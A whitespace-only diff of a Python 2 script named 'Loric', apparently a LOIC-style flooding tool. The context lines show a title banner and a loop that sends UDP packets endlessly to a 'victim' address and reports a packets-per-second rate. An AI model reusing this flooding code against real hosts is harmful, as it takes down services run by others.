@@ -17,7 +17,7 @@ import sys
 	Main class
 """
 class Loric:
-	
+
 	"""
 		Init
 	"""
@@ -28,8 +28,8 @@ class Loric:
 		self.title()
 		self.helper()
 		self.loop()
-		
-		
+
+
 	"""
 		Print the title
 	"""
@@ -40,14 +40,14 @@ class Loric:
 			system("clear")
 		else:
 			print 10*"\n"
-			
+
 		ltitle = ["                _",\
 			  " _             |_|       ",\
 			  "| |   ___  ___  _  ___",\
 			  "| |_ |   ||  _|| || __|",\
 			  "|___||___||_|  |_||___|"]
-		
-		print hprint("Welcome in Loric v"+self._version,col="blue",style="bold")		
+
+		print hprint("Welcome in Loric v"+self._version,col="blue",style="bold")
 		for i in ltitle :
 			print hprint(i,col="yellow",style="bold")
 		print ""
@@ -121,7 +121,7 @@ class Loric:
 			while 1:
 				try:
 					sock.sendto(packetToSend,(self._victim,defPort))
-					cnt += 1 
+					cnt += 1
 				except KeyboardInterrupt:
 					raise KeyboardInterrupt
 				except:
@@ -129,7 +129,7 @@ class Loric:
 					cnt += 1
 					print "  INFO> %d packets failed.\r" %cnterr,
 					sys.stdout.flush()
-				
+
 
 		except KeyboardInterrupt:
 			t1 = time()
@@ -140,7 +140,7 @@ class Loric:
 			print "    Ratio: "+str((cnt-cnterr)/(t1-t0))+" packets/sec."
 
 
-""" 
-	Create an instance of the class 
+"""
+	Create an instance of the class
 """
 Loric()
